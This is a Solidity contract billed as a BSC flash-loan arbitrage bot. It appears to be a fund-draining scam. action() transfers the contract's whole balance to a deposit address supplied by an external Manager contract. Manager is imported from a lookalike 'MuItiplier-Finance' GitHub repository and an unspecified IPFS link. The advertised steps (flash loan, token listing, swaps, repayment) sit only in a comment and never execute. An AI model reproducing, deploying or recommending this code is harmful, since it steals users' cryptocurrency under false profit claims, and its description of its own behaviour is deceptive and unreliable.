pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/MuItiplier-Finance/MCL-FlashloanDemo/blob/master/contracts/interfaces/ILendingPool.sol";
import "https://github.com/Mathiaszero/eattheblocks/blob/master/screencast/310-flashloan-bsc/contracts/interfaces/ILoanRepay.sol";
import "https://github.com/MuItiplier-Finance/MCL-FlashloanDemo/blob/master/contracts/interfaces/ILendingPoolAddressesProvider.sol";

// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

//https://ipfs.io/ipfs/<insert ipfs hash here>


contract GetFlashLoan {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	Manager manager;
	
	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		loanAmount = _loanAmount;
			
		manager = new Manager();
	}
	
	function() external payable {}
	
	function action() public payable {
	    // Send required coins for swap
	    address(uint160(manager.pancakeDepositAddress())).transfer(address(this).balance);
	    
	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
	    // Breakdown of functions written below
	    manager.performTasks();
	    
	    /* Breakdown of functions
	    // Submit token to BSC blockchain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

        // List the token on PancakeSwap
		manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
		
        // Get BNB Loan from Multiplier-Finance
		string memory loanAddress = manager.takeFlashLoan(loanAmount);
		
		// Convert half BNB to DAI
		manager.pancakeDAItoBNB(loanAmount / 2);

        // Create BNB and DAI pairs for our token & Provide liquidity
        string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
		manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
		string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
		manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
    
        // Perform swaps and profit on Self-Arbitrage
		manager.pancakePerformSwaps();
		
		// Move remaining BNB from Contract to your account
		manager.contractToWallet("BNB");

        // Repay Flash loan
		manager.repayLoan(loanAddress);
	    */
	}
}
